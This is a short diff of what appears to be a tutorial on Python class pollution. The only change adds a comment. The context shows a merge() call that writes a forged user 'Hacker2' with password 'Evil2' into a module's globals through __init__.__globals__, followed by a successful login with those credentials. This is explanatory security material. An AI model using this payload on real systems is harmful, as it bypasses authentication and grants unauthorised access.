@@ -196,7 +196,7 @@ myObject2 = Theme()
 merge(myObject2, {"__init__":{"__globals__":{"users":{"Hacker2": "Evil2"}}}})
 username = "Hacker2"
 password = "Evil2"
-try_login(username, password)
+try_login(username, password) # Logged in
 ```
 
 What if the class in different files and import as module
